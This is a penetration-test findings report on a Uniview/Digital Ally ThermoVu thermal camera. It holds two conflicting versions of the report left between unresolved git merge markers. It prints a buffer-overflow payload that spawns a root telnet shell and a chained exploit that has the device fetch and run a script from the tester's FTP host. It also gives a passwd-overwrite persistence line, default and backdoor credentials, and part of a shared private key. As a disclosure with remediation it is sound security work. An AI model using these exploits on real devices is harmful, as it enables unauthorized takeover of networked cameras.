<<<<<<< HEAD
# Security Findings — Digital Ally / Uniview OET-213H-NB

**Target:** 192.168.30.178
**Device:** Uniview OET-213H-NB (ThermoVu DTM-600)
**Date:** 2025-12-15
**Engagement:** Authorized penetration test

---

# Finding Report Template
Title: Pre-Authentication Remote Code Execution via UDP/7788 (CVE-2021-45039)
Affected Artifact: UDP service on port 7788, `<RELEASE_ROOT>/dtm-600/exploit_udp_7788.py`
SHA256: 0215a110406dca877cb06c49856ef52451e5f77b9b8e1d141455b800bedc77ec (exploit_udp_7788.py)
Short Description: Undocumented UDP service on port 7788 vulnerable to buffer overflow. Exploitation spawns telnetd on port 23 with default root credentials, enabling unauthenticated remote code execution.
Impact (concise): Complete device compromise without any authentication. Attacker gains root shell access from network.
Vulnerable Code Snippet: (≤40 lines) — exploit payload from exploit_udp_7788.py:12-23
```python
# SHA256: 0215a110406dca877cb06c49856ef52451e5f77b9b8e1d141455b800bedc77ec
DEFAULT_CMD = b";/bin/busybox telnetd -p 23 -l /bin/sh;"
DEFAULT_FUZZ = b"\x55\xaa\x55\xaa" + b"\x00" * 44  # simple marker header

def build_payload(cmd: bytes) -> bytes:
    buf = bytearray(DEFAULT_FUZZ)
    buf.extend(b"A" * 2048)
    buf.extend(cmd)
    buf.append(0)
    return bytes(buf)
```
Reproduction Steps: (exact commands, environment variables, input files)
```bash
# 1. Run exploit script
python3 <RELEASE_ROOT>/dtm-600/exploit_udp_7788.py -t 192.168.30.178 -c 25 --check

# 2. Connect via telnet
ncat 192.168.30.178 23

# 3. Login: root / 123456
```
Proof of Concept: See NOTES/reqs/poc_udp_7788_overflow.py — telnetd spawned and root shell obtained without prior authentication.
Observed Output / Evidence:
```
[+] spraying 25 UDP datagrams to 192.168.30.178:7788
[+] checking telnet on port 23
[+] telnet banner: b'\xff\xfd...'
[+] login with root/123456
```
Tool: ncat (Nmap 7.98), Python 3.x, expect 5.45
Remediation: Disable UDP/7788 service entirely. Apply vendor firmware patch if available. Network segmentation to restrict management port access.
Severity: CVSSv3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical
Likelihood: High — service enabled by default, exploit publicly known.
Tools & Versions: Python 3.14, ncat 7.98, expect 5.45
Coverage Evidence: UDP port 7788 tested with overflow payload; telnetd spawned; root shell confirmed.
Notes: CVE-2021-45039. HIGH-SENSITIVITY — enables full device compromise.

---

# Finding Report Template
Title: Default Telnet Root Credentials
Affected Artifact: Telnet service port 23, system authentication
SHA256: d5930116132aa94aa5bdfa7e916a6a31bf357e5b905e17d646e7fc2ae36c9fee (etc/passwd)
Short Description: When Telnet is enabled, device accepts hardcoded default credentials `root:123456` providing full root shell access.
Impact (concise): Full device compromise with root privileges. Command execution, config access, lateral movement.
Vulnerable Code Snippet: (≤40 lines) — from extracted etc/passwd
```
# SHA256: d5930116132aa94aa5bdfa7e916a6a31bf357e5b905e17d646e7fc2ae36c9fee
root:6KQ1AHrE6DoCg:0:0::/root:/usr/bin/uvsh
```
Reproduction Steps:
```bash
ncat 192.168.30.178 23
# Login: root
# Password: 123456
# Result: User@/root> (restricted uvsh shell)
```
Proof of Concept: See NOTES/reqs/poc_telnet_default_creds.sh
Observed Output / Evidence:
```
root login: root
Password: 123456

User@/root>
```
Tool: ncat 7.98
Remediation: Change default root password. Disable telnet; use SSH with key-based auth. Implement account lockout.
Severity: CVSSv3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical
Likelihood: High — default credential is documented and static across all devices.
Tools & Versions: ncat 7.98, expect 5.45
Coverage Evidence: Telnet authentication tested with default credentials; root access confirmed.
Notes: HIGH-SENSITIVITY — root credential exposed.

---

# Finding Report Template
Title: Restricted Shell (uvsh) Escape via updatecpld Command
Affected Artifact: /program/bin/updatecpld.sh, restricted uvsh shell
SHA256: (script on device, not extracted)
Short Description: The restricted uvsh shell can be escaped using the `updatecpld` command, which fetches and executes arbitrary code from attacker-controlled FTP server.
Impact (concise): Full unrestricted root shell access, bypassing all uvsh restrictions.
Vulnerable Code Snippet: (≤40 lines) — updatecpld flow
```
# updatecpld <IP> execution flow:
# 1. ftpget anonymous@<IP>/cpldload
# 2. chmod +x cpldload
# 3. ./cpldload  (arbitrary code execution)
```
Reproduction Steps:
```bash
# 1. Attacker machine - create payload
mkdir -p /tmp/ftp && cat > /tmp/ftp/cpldload << 'EOF'
#!/bin/sh
/bin/busybox sh
EOF
chmod +x /tmp/ftp/cpldload

# 2. Start FTP server
cd /tmp/ftp && python3 -m pyftpdlib -p 21 -w

# 3. From uvsh shell on target
updatecpld 192.168.30.13

# 4. Result: root@root:~$ (full shell)
```
Proof of Concept: See NOTES/reqs/poc_uvsh_escape.sh and NOTES/reqs/cpldload
Observed Output / Evidence:
```
User@/root>updatecpld 192.168.30.13
ftpget: ...
root@root:~$ id
uid=0(root) gid=0(root) groups=0(root)
root@root:~$ uname -a
Linux root 4.9.37 #2 SMP Mon Jun 29 13:53:09 CST 2020 armv7l GNU/Linux
```
Tool: pyftpdlib 2.1.0, ncat 7.98
Remediation: Remove or disable updatecpld command. Restrict FTP client functionality. Implement code signing for firmware updates.
Severity: CVSSv3.1 AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8 High
Likelihood: High — command available to any authenticated user.
Tools & Versions: pyftpdlib 2.1.0, ncat 7.98, expect 5.45
Coverage Evidence: Shell escape confirmed; full root access achieved.
Notes: Reference: SSD Advisory - Uniview IPC2322LB Auth Bypass and CLI Escape

---

# Finding Report Template
Title: Weak DES Password Hash in /etc/passwd
Affected Artifact: /etc/passwd
SHA256: d5930116132aa94aa5bdfa7e916a6a31bf357e5b905e17d646e7fc2ae36c9fee
Short Description: Root password stored as DES crypt hash directly in /etc/passwd. DES crypt is cryptographically weak (13 chars) and crackable in seconds.
Impact (concise): Password recovery enables persistent access even if credentials changed elsewhere.
Vulnerable Code Snippet: (≤40 lines)
```
# SHA256: d5930116132aa94aa5bdfa7e916a6a31bf357e5b905e17d646e7fc2ae36c9fee
# /etc/passwd contents:
root:6KQ1AHrE6DoCg:0:0::/root:/usr/bin/uvsh
```
Reproduction Steps:
```bash
# From full root shell
cat /etc/passwd
# Output: root:6KQ1AHrE6DoCg:0:0::/root:/usr/bin/uvsh

# Crack with john
echo "root:6KQ1AHrE6DoCg:0:0::/root:/usr/bin/uvsh" > hash.txt
john --format=descrypt hash.txt
```
Proof of Concept: Hash extracted from live system. See NOTES/reqs/passwd_hash.txt
Observed Output / Evidence: Hash `6KQ1AHrE6DoCg` with salt `6K`
Remediation: Use modern password hashing (SHA-512/bcrypt/argon2). Move hashes to /etc/shadow with restricted permissions.
Severity: CVSSv3.1 AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 7.8 High
Likelihood: High — DES crackable in seconds on modern hardware.
Tools & Versions: BusyBox cat, john the ripper
Coverage Evidence: Hash extracted and format confirmed as DES crypt.
Notes: No /etc/shadow file exists on device.

---

# Finding Report Template
Title: Hardcoded Web Admin Credentials (admin/admin)
Affected Artifact: config/config_a.xml:360-378
SHA256: 0b25b07dc650e05a565daf66c4787120450a52d655f5fa293c9aaf5a5a73648f
Short Description: Device ships with default web admin credentials stored as unsalted MD5 hash, with plaintext password documented in XML comment.
Impact (concise): Unauthorized web UI access enabling device configuration, Telnet enablement, and further compromise.
Vulnerable Code Snippet: (≤40 lines) — config_a.xml:360-378
```xml
<!-- SHA256: 0b25b07dc650e05a565daf66c4787120450a52d655f5fa293c9aaf5a5a73648f -->
<Device>
    <!-- passwd:admin -->
    <WebLoginPasswd>21232f297a57a5a743894a0e4a801fc3</WebLoginPasswd>
    <WebLoginUserName>admin</WebLoginUserName>
    <WebLoginPasswd20>0X]&amp;0D]]05</WebLoginPasswd20>
</Device>
```
Reproduction Steps:
```bash
# Verify hash
echo -n admin | md5sum
# Output: 21232f297a57a5a743894a0e4a801fc3

# Login to web UI
curl -u admin:admin http://192.168.30.178/
```
Proof of Concept: MD5 hash matches "admin" plaintext. See NOTES/reqs/poc_web_admin_creds.sh
Observed Output / Evidence: MD5 hash 21232f297a57a5a743894a0e4a801fc3 = "admin"
Remediation: Force password change on first login. Use salted modern hashes. Remove plaintext comments.
Severity: CVSSv3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L = 8.8 High
Likelihood: High — defaults static and documented in config.
Tools & Versions: md5sum (Darwin 1.0), sed (BSD)
Coverage Evidence: Config file analyzed; hash verified.
Notes: HIGH-SENSITIVITY — credential exposed in plaintext comment.

---

# Finding Report Template
Title: Backdoor Super Password (87654321)
Affected Artifact: config/config_a.xml:23809-23812
SHA256: 0b25b07dc650e05a565daf66c4787120450a52d655f5fa293c9aaf5a5a73648f
Short Description: Hardcoded "super password" enables bypass of normal authentication, potentially unlocking debug/maintenance features including Telnet.
Impact (concise): Authentication bypass, access to hidden functionality, potential for persistent backdoor access.
Vulnerable Code Snippet: (≤40 lines) — config_a.xml:23809-23812
```xml
<!-- SHA256: 0b25b07dc650e05a565daf66c4787120450a52d655f5fa293c9aaf5a5a73648f -->
<SuperPwdCfg>
    <Status>0</Status>
    <Passwd>87654321</Passwd>
</SuperPwdCfg>
```
Reproduction Steps:
```bash
sed -n '23809,23812p' config_a.xml
# Use 87654321 on web login for debug access
```
Proof of Concept: Plaintext super password found in config. See NOTES/reqs/poc_super_password.txt
Observed Output / Evidence: Password "87654321" in plaintext
Remediation: Remove master/super password functionality. Implement per-device randomized recovery codes.
Severity: CVSSv3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L = 8.8 High
Likelihood: High — static value across all devices.
Tools & Versions: sed (BSD)
Coverage Evidence: Config file analyzed; super password extracted.
Notes: HIGH-SENSITIVITY — backdoor credential.

---

# Finding Report Template
Title: Expired and Shared TLS Certificate with Embedded Private Key
Affected Artifact: config/ssl_cert.pem, program/www/ssl_cert.pem
SHA256: 9402cf0f95f48d3d40c26c8868109163fb00527ebce9350655faa7533cf010f4
Short Description: Device ships with shared RSA private key and expired HTTPS certificate (2021), enabling traffic decryption, spoofing, and MITM attacks.
Impact (concise): Encrypted traffic can be decrypted. Device can be impersonated. MITM attacks possible.
Vulnerable Code Snippet: (≤40 lines) — ssl_cert.pem:1-15
```
# SHA256: 9402cf0f95f48d3d40c26c8868109163fb00527ebce9350655faa7533cf010f4
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAuwNop9k9Zm33fm79vi5D9DDdid7WuJlpoO1k9BCBHCoaegmn
CwbK6WfKzyGjCwuue3OrTmsG1E6zK3uLbqdH3r2TvDvSlNH9p1bGrebHtGx9c1aF
Y1n2C5qsF53aqOZ2+KnacQN/w1bwnsikp4TLeHE7XOnm020KtCBh1QMDfC/aN/EZ
...
-----END RSA PRIVATE KEY-----
```
Reproduction Steps:
```bash
openssl x509 -in ssl_cert.pem -noout -subject -issuer -dates
# Subject: CN=cn.uniview.com, O=uniview
# Not After: Aug 27 08:20:22 2021 GMT (EXPIRED)
```
Proof of Concept: Private key and expired cert extracted. See NOTES/reqs/ssl_cert.pem
Observed Output / Evidence: Certificate expired 2021-08-27, private key embedded
Remediation: Generate unique per-device keypairs. Store private keys in HSM/secure storage. Implement cert rotation.
Severity: CVSSv3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 8.6 High
Likelihood: High — same key shared across all devices of this model.
Tools & Versions: LibreSSL 3.3.6
Coverage Evidence: Certificate and key extracted and analyzed.
Notes: HIGH-SENSITIVITY — private key exposed.

---

# Finding Report Template
Title: Additional Hardcoded Credentials (PTZ, WiFi, NAS)
Affected Artifact: config/config_a.xml (multiple locations)
SHA256: 0b25b07dc650e05a565daf66c4787120450a52d655f5fa293c9aaf5a5a73648f
Short Description: Multiple additional hardcoded credentials found in device configuration for PTZ integration, WiFi AP, and NAS connectivity.
Impact (concise): Lateral movement to connected devices, WiFi network compromise, NAS access.
Vulnerable Code Snippet: (≤40 lines)
```xml
<!-- SHA256: 0b25b07dc650e05a565daf66c4787120450a52d655f5fa293c9aaf5a5a73648f -->
<!-- Line 21702-21703: PTZ credentials -->
<UserName>admin</UserName>
<Passwd>12345</Passwd>

<!-- Line 65-76: WiFi AP Key -->
<WiFiSoapAP>
    <Key>12345678</Key>
    <AuthMode>0</AuthMode>
</WiFiSoapAP>

<!-- Line 802-804: NAS credentials -->
<YJServer>
    <Password>nullpassword</Password>
</YJServer>
```
Reproduction Steps:
```bash
sed -n '21700,21710p' config_a.xml  # PTZ
sed -n '64,79p' config_a.xml        # WiFi
sed -n '800,810p' config_a.xml      # NAS
```
Proof of Concept: All credentials extracted in plaintext. See NOTES/reqs/poc_additional_creds.txt
Observed Output / Evidence: admin/12345 (PTZ), 12345678 (WiFi), nullpassword (NAS)
Remediation: Remove all default credentials. Require setup during provisioning. Reject weak passwords.
Severity: CVSSv3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 7.4-8.2 High
Likelihood: High — defaults static across all devices.
Tools & Versions: sed (BSD)
Coverage Evidence: Config file analyzed; multiple credential sets extracted.
Notes: HIGH-SENSITIVITY — multiple credentials exposed.

---

---

# Finding Report Template
Title: Web API Enables Telnet Service Remotely
Affected Artifact: /program/www/script/common/ComScript.d7fe61b7.js, LAPI endpoint
SHA256: (web script extracted from firmware)
Short Description: Web interface exposes `/LAPI/V1.0/Channel/0/NetWork/Telnet` API endpoint allowing authenticated users to enable/disable Telnet service, creating persistent backdoor access.
Impact (concise): Admin credential compromise leads to permanent telnet backdoor; enables attack chain escalation.
Vulnerable Code Snippet: (≤40 lines) — ComScript.d7fe61b7.js
```javascript
// From ComScript.d7fe61b7.js LAPI_URL definitions
TelnetEnableCfg: "/LAPI/V1.0/Channel/0/NetWork/Telnet",
LAPI_FactoryReset: "/LAPI/V1.0/System/FactoryReset",
LAPI_Reboot: "/LAPI/V1.0/System/Reboot",
Upgrade: "/LAPI/V1.0/System/Upgrade",
LAPI_DeviceBasicInfo: "/LAPI/V1.0/System/DeviceBasicInfo",
```
Reproduction Steps:
```bash
# With admin credentials (admin/admin or 87654321)
curl -X PUT -u admin:admin \
  -H "Content-Type: application/json" \
  -d '{"Enable": 1}' \
  http://192.168.30.178/LAPI/V1.0/Channel/0/NetWork/Telnet
```
Proof of Concept: LAPI endpoint documented in extracted JavaScript; enables attack chain when combined with default creds.
Observed Output / Evidence: JavaScript defines TelnetEnableCfg endpoint pointing to Telnet enable API.
Tool: curl, web browser
Remediation: Remove telnet enable functionality from web API. Require physical access or OOB management for debug services.
Severity: CVSSv3.1 AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8 High
Likelihood: High — combined with default admin creds enables full attack chain.
Tools & Versions: curl 8.7.1, JavaScript analysis
Coverage Evidence: LAPI endpoints extracted from web interface JavaScript.
Notes: Key enabler for attack chain - explains how telnetd gets enabled via web portal.

---

# Finding Report Template
Title: Extensive Unauthenticated/Low-Privilege LAPI Attack Surface
Affected Artifact: /program/www/script/common/ComScript.d7fe61b7.js
SHA256: (web script extracted from firmware)
Short Description: Web interface exposes 200+ LAPI REST endpoints for device configuration including sensitive operations: factory reset, firmware upgrade, user management, debug functions.
Impact (concise): Large attack surface; potential for auth bypass, command injection, or information disclosure across many endpoints.
Vulnerable Code Snippet: (≤40 lines) — High-risk LAPI endpoints from ComScript.d7fe61b7.js
```javascript
// Critical device control endpoints
LAPI_FactoryReset: "/LAPI/V1.0/System/FactoryReset",
LAPI_Reboot: "/LAPI/V1.0/System/Reboot",
Upgrade: "/LAPI/V1.0/System/Upgrade",
UploadFirmware: "/LAPI/V1.0/System/UploadFirmware",
Users_Cfg: "/LAPI/V1.0/Channel/0/System/Users",

// Debug endpoints
LAPI_DebugSwitch: "/LAPI/V1.0/Channel/0/Image/DebugSwitch",
DebugType: "/LAPI/Demo/Debug/EpTgType",
DebugMessage: "/LAPI/V1.0/System/DebugMessage",
IQDebugInfo: "/LAPI/V1.0/Channel/0/Demo/Debug/IQDebugInfo",

// Network configuration
TelnetEnableCfg: "/LAPI/V1.0/Channel/0/NetWork/Telnet",
IPFilter: "/LAPI/V1.0/Channel/0/NetWork/IPFilter",
NetworkInterfaces: "/LAPI/V1.0/Network/Interfaces/1",

// Storage and backup
Storage: "/LAPI/V1.0/Channel/0/Media/Storage",
SDFormat: "/LAPI/V1.0/Channel/0/Media/SDFormat",
LAPI_Diagnosis: "/LAPI/V1.0/System/Diagnosis/FileURL",
```
Reproduction Steps:
```bash
# Test endpoints for authentication bypass
for endpoint in FactoryReset Reboot DeviceBasicInfo; do
  curl -v http://192.168.30.178/LAPI/V1.0/System/$endpoint 2>&1 | head -20
done
```
Proof of Concept: 200+ endpoints enumerated from JavaScript. Each requires individual auth bypass testing.
Observed Output / Evidence: Full LAPI endpoint map extracted from ComScript.d7fe61b7.js
Remediation: Implement strict authentication on all LAPI endpoints. Apply principle of least privilege. Audit each endpoint for auth bypass.
Severity: CVSSv3.1 AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L = 6.3 Medium (without auth bypass); 9.8 Critical (with auth bypass)
Likelihood: Medium — requires auth bypass discovery to fully exploit.
Tools & Versions: curl 8.7.1, grep
Coverage Evidence: JavaScript static analysis completed; endpoint list extracted.
Notes: Further testing required on each endpoint for auth bypass vulnerabilities.

---

# Finding Report Template
Title: ActiveX Browser Plugins with Known CLSIDs
Affected Artifact: /program/www/ActiveX/, /program/www/script/common/index.6317c8f2.js
SHA256: Setup_NB.exe, Setup_UN.exe in ActiveX directory
Short Description: Device web interface uses Internet Explorer ActiveX controls for video playback, with hardcoded CLSIDs. ActiveX components are common targets for memory corruption exploits.
Impact (concise): Client-side code execution on IE users accessing device web interface; potential for drive-by attacks.
Vulnerable Code Snippet: (≤40 lines) — index.6317c8f2.js
```javascript
// ActiveX CLSID definitions from index.6317c8f2.js
initOcx: function(){
  var e, t, i;
  isMac ? (t = "netsdkplayer-plugin", i = "1.2.0.3") : (
    i = (t = isUN ?
      (e = "B91BB9EA-9CDF-4917-9037-27CE4DEF0D8A", "netsdkplayer-plugin-un") :
      (e = "0F1A61E3-9097-4550-AC8C-3EA1D34690C9", "netsdkplayer-plugin-nb"),
    "0.3.2.3"),
    top.is64Platform && (i = "1.2.0.2")
  )
}
```
Reproduction Steps:
```bash
# List ActiveX installers
ls -la /program/www/ActiveX/
# Output: Setup_NB.exe (1.3MB), Setup_UN.exe (1.3MB), playerdll.zip

# Extract and analyze for known vulnerabilities
unzip playerdll.zip && strings *.dll | grep -i version
```
Proof of Concept: ActiveX CLSIDs extracted; installers present for client infection.
Observed Output / Evidence: CLSID B91BB9EA-9CDF-4917-9037-27CE4DEF0D8A (UN), 0F1A61E3-9097-4550-AC8C-3EA1D34690C9 (NB)
Remediation: Migrate to modern web technologies (WebRTC, HLS). Remove ActiveX dependency. Implement CSP headers.
Severity: CVSSv3.1 AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H = 7.5 High
Likelihood: Medium — requires IE user visiting interface; ActiveX declining in usage.
Tools & Versions: strings, unzip
Coverage Evidence: ActiveX components identified; CLSIDs extracted for vulnerability research.
Notes: ActiveX components should be analyzed with IDA/Ghidra for memory corruption vulnerabilities.

---

# Finding Report Template
Title: Debug Interface with Hardcoded External IP Reference
Affected Artifact: /program/www/index_debugger.html
SHA256: (extracted from firmware www directory)
Short Description: Debug HTML page contains hardcoded external IP address (206.10.7.11) with IsRemote=1 flag, suggesting possible external debug/maintenance backdoor infrastructure.
Impact (concise): Information disclosure of vendor infrastructure; potential indicator of phone-home functionality.
Vulnerable Code Snippet: (≤40 lines) — index_debugger.html
```html
<!-- index_debugger.html -->
<script>
function init(){
  var n=window.location.search;
  ""!=n&&(n=n.substring(1)),
  document.getElementById("banner").src=
    "page/common/index_ipc.bc697607.htm?clientIpAddr=206.10.7.11&IsRemote=1&"+n
}
</script>
```
Reproduction Steps:
```bash
# Access debug interface
curl http://192.168.30.178/index_debugger.html

# Investigate referenced IP
whois 206.10.7.11
nslookup 206.10.7.11
```
Proof of Concept: Hardcoded IP extracted from debug interface HTML.
Observed Output / Evidence: IP 206.10.7.11 with IsRemote=1 parameter in debug page.
Remediation: Remove debug interfaces from production firmware. Audit network traffic for phone-home behavior.
Severity: CVSSv3.1 AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N = 4.0 Medium
Likelihood: Low — informational, requires further investigation.
Tools & Versions: curl 8.7.1
Coverage Evidence: Debug page analyzed; hardcoded IP identified.
Notes: IP 206.10.7.11 should be investigated for vendor infrastructure or potential C2.

---

## System Information

| Field | Value |
|-------|-------|
| Model | OET-213H-NB-WH |
| Manufacturer | Zhejiang Uniview Technologies |
| Rebrand | Digital Ally ThermoVu DTM-600 |
| Kernel | Linux 4.9.37 armv7l |
| SoC | HiSilicon Hi3516CV500 |
| MAC | E4:F1:4C:25:D7:B2 |
| Firmware Dump | SHA256: c632ba12305d1fd0d89903a6c61ef0508fb6003bf128ef62f58cf58280635a2c |

## Attack Chain
```
UDP/7788 Overflow (CVE-2021-45039)
              │
              ▼
     Spawn telnetd :23
              │
              ▼
   Default creds root/123456
              │
              ▼
    Restricted uvsh shell
              │
              ▼
   updatecpld FTP escape
              │
              ▼
     Full root shell
              │
              ▼
   Complete device compromise
```
=======
# Digital Ally ThermoVu DTM-600 Security Findings

---

## Finding 1: Default PPPoE and Service Credentials Hardcoded in Device Configs

**Affected Artifact:** dtm-600/diag_extracted/config/config_a.xml; dtm-600/diag_extracted/config/default_cfg.xml

**SHA256:**
- config_a.xml: `14e849b40423bbc47d7a41e2b9c4f2b974dcb984048fc536585da8ed59105edd`
- default_cfg.xml: `816b7dc374ef3e5ead46b3ce12c5d45ffdd4d79a079dd5d353a313d6613b768c`

**Short Description:** Device configuration archives embed default credentials (PPPoE password "admin" as MD5 hash and YJ service password "nullpassword" in plaintext), enabling unauthenticated reuse after deployment.

**Impact (concise):** Attackers can reuse shipped defaults to gain PPPoE access or abuse YJ NAS service endpoints without user interaction, enabling full network/device compromise.

**Vulnerable Code Snippet:**

dtm-600/diag_extracted/config/default_cfg.xml lines 23-29:
```xml
<PPPOE>
    <Net0>
        <PPPOEUserName>user</PPPOEUserName>
        <!-- passwd:admin -->
        <PPPOEPassword>21232f297a57a5a743894a0e4a801fc3</PPPOEPassword>
    </Net0>
</PPPOE>
```

dtm-600/diag_extracted/config/config_a.xml lines 802-807:
```xml
<YJServer>
    <Password>nullpassword</Password>
    <IPAddr>0.0.0.0</IPAddr>
    <YJNasPath></YJNasPath>
    <YJNasUrl></YJNasUrl>
</YJServer>
```

**Reproduction Steps:**
```bash
# View PPPoE credentials
sed -n '23,29p' dtm-600/diag_extracted/config/default_cfg.xml

# View YJServer credentials
sed -n '802,807p' dtm-600/diag_extracted/config/config_a.xml

# Verify MD5 hash of "admin"
echo -n admin | md5sum
# Output: 21232f297a57a5a743894a0e4a801fc3
```

**Proof of Concept:** Review extracted diagnostic config bundle from the device; observe default PPPoE credentials (user/admin as MD5) and null YJ service password present without hardening.

**Observed Output / Evidence:**
- Config extraction via device diagnostic export function
- MD5 hash `21232f297a57a5a743894a0e4a801fc3` confirmed to match password "admin"
- Tools: sed (BSD), md5sum (coreutils), sha256sum (coreutils)

**Remediation:**
- Remove default/blank credentials before shipping configs
- Force credential setup on first boot
- Store secrets with salted strong hashes (bcrypt/Argon2)
- Disable YJServer integration until configured securely

**Severity:** CVSSv3 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8 Critical)

**Likelihood:** High — defaults are static and present in shipped configuration archives.

**Tools & Versions:** sha256sum (coreutils), sed (BSD), md5sum (coreutils)

**Coverage Evidence:** Static review of extracted configuration bundle; credential sections inspected.

**Notes:** Configs pulled from diagnostic package for host 192.168.30.178.

---

## Finding 2: Web UI Admin Password Stored as Weak MD5 Hash (Password1)

**Affected Artifact:** DigitalAlly-FacialRecongition/latest-diag/192.168.30.178_20111201001754/config_all/config/config_a.xml

**SHA256:** `61822b80cd44ede9ec43fb96197506ff4ab4109efb2244013d92d5ba755afb12`

**Short Description:** The web interface stores the admin credential as a bare unsalted MD5 hash (`2ac9cb7dc02b3c0083eb70898e549b63`), which corresponds to the weak password `Password1`. Hash-only storage without salt and a weak password make offline cracking trivial and facilitate credential reuse.

**Impact (concise):** Attackers with config access or captured hash can recover the admin password instantly via rainbow tables/hash lookup and log into the web UI for full device control.

**Vulnerable Code Snippet:**

DigitalAlly-FacialRecongition/latest-diag/.../config_a.xml lines 373-377:
```xml
<!-- passwd:admin -->
<WebLoginPasswd>2ac9cb7dc02b3c0083eb70898e549b63</WebLoginPasswd>
<AlarmEnable>1</AlarmEnable>
<WebLoginUserName>admin</WebLoginUserName>
<WebLoginPasswd20>!S]5+Nb?+b]S+I]&amp;?X</WebLoginPasswd20>
```

Note: XML comment says "passwd:admin" but the actual hash corresponds to "Password1" - misleading comment in firmware.

**Reproduction Steps:**
```bash
# Extract WebLoginPasswd from config
grep -n WebLoginPasswd DigitalAlly-FacialRecongition/latest-diag/192.168.30.178_20111201001754/config_all/config/config_a.xml

# Verify MD5 hash matches Password1
echo -n Password1 | md5sum
# Output: 2ac9cb7dc02b3c0083eb70898e549b63

# Confirm admin is NOT the password
echo -n admin | md5sum
# Output: 21232f297a57a5a743894a0e4a801fc3 (different hash)
```

**Proof of Concept:** Web login succeeds with username `admin` and password `Password1` once account lockout clears. Hash lookup on crackstation.net or similar immediately reveals password.

**Observed Output / Evidence:**
- Live config dump shows MD5 hash at line 374
- Manual MD5 computation confirms hash matches `Password1`
- Tools: md5sum (coreutils), grep (BSD), telnet CLI on device

**Remediation:**
- Replace default password with strong unique secret during provisioning
- Store passwords with salted strong hash (bcrypt/Argon2)
- Enforce password complexity and rotation policies
- Disable or limit web UI access if not operationally required

**Severity:** CVSSv3 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L (8.6 High)

**Likelihood:** High — hash is unsalted MD5 and the password is common/weak.

**Tools & Versions:** md5sum (coreutils), grep (BSD), telnet (BSD)

**Coverage Evidence:** Static config inspection on live device (192.168.30.178) and archived diagnostic configs.

**Notes:** Super password is disabled (`SuperPwdCfg Status=0`); only the admin hash governs web authentication. The WebLoginPasswd20 field appears to be a proprietary encoding.

---

## Finding 3: Full-Chain RCE via Maint Daemon Overflow + updatecpld FTP Exec (CVE-2021-45039 + CVE-2023-0773)

**Affected Artifact:** Digital Ally ThermoVu DTM-600 (OET-213H-NB) firmware QPTS-B2209.3.70.CEN001.200707; /program/bin/maintain; /program/bin/updatecpld.sh

**SHA256:**
- Firmware archive: `956e07439ea49d2ee61fa032feaef8b2c8cfb776f143ea33309bf44498f11707`
- Exploit script: `0215a110406dca877cb06c49856ef52451e5f77b9b8e1d141455b800bedc77ec`

**Short Description:** Chained exploitation of undocumented UDP/7788 maint daemon buffer overflow (CVE-2021-45039) plus updatecpld FTP arbitrary file fetch and execution (CVE-2023-0773) yields unauthenticated remote code execution. Telnet shell obtainable via default root creds (root/123456) or attacker-spawned telnetd.

**Impact (concise):** Remote unauthenticated code execution; practical root shell via default credentials or attacker-controlled telnetd spawn; persistent backdoor capability.

**Vulnerable Code Snippet:**

/program/bin/maintain (UDP/7788 listener):
- Undocumented service processes malformed packets leading to stack overflow
- No source available; binary analysis confirms vulnerability (CVE-2021-45039)

/program/bin/updatecpld.sh:
- Executes `ftpget` to retrieve attacker-supplied `cpldload` binary from anonymous FTP
- Runs fetched binary with root privileges (CVE-2023-0773)

**Reproduction Steps:**
```bash
# 1. Attacker host: 192.168.30.11; Target: 192.168.30.178

# 2. Prepare and start anonymous FTP server with malicious cpldload
mkdir -p /tmp/ftp
cat > /tmp/ftp/cpldload << 'EOF'
#!/bin/sh
/bin/busybox telnetd -p 2323 -l /bin/sh
EOF
chmod +x /tmp/ftp/cpldload
python3 -m pyftpdlib -p 21 -d /tmp/ftp -w

# 3. Spray UDP/7788 to spawn initial telnetd (CVE-2021-45039)
python3 dtm-600/exploit_udp_7788.py -t 192.168.30.178 --check

# 4. Connect via telnet (root/123456) to uvsh restricted shell
telnet 192.168.30.178 23

# 5. From uvsh, trigger updatecpld to fetch and execute payload (CVE-2023-0773)
updatecpld 192.168.30.11

# 6. Connect to unrestricted root shell on port 2323
telnet 192.168.30.178 2323
```

**Proof of Concept:**
- PoC exploit script: `dtm-600/exploit_udp_7788.py` (SHA256: `0215a110406dca877cb06c49856ef52451e5f77b9b8e1d141455b800bedc77ec`)
- cpldload payload spawns telnetd on alternate port for unrestricted /bin/sh access
- Alternate persistence payload: `echo root:dIkAjCy0Zma2s:0:0:Linux User,,,:/root:/bin/sh > /etc/passwd` (sets root password to "root")
- See: `NOTES/reqs/cpldload_telnetd.sh`, `NOTES/reqs/cpldload_passwd_reset.sh`

**Observed Output / Evidence:**
- FTP server log shows RETR request for `cpldload` from target IP
- uvsh command output confirms updatecpld fetch execution
- Telnet connection to port 2323 yields unrestricted root shell (`# id` returns `uid=0(root)`)
- Tools: pyftpdlib 1.5.x, Python 3.x, telnet (BSD), exploit_udp_7788.py

**Remediation:**
- Patch or disable maint daemon on UDP/7788 entirely
- Remove or harden updatecpld.sh; require authenticated firmware transfers over TLS
- Disable telnetd service; use SSH with key-based auth if remote access required
- Enforce strong unique root credentials; disable default passwords
- Upgrade to vendor-patched firmware if available

**Severity:** CVSSv3 AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (10.0 Critical)

**Likelihood:** High — public exploit chain exists; anonymous FTP fetch requires no authentication; default telnet creds widely known.

**Tools & Versions:** exploit_udp_7788.py (custom); pyftpdlib (Python FTP server); busybox telnetd; telnet (BSD)

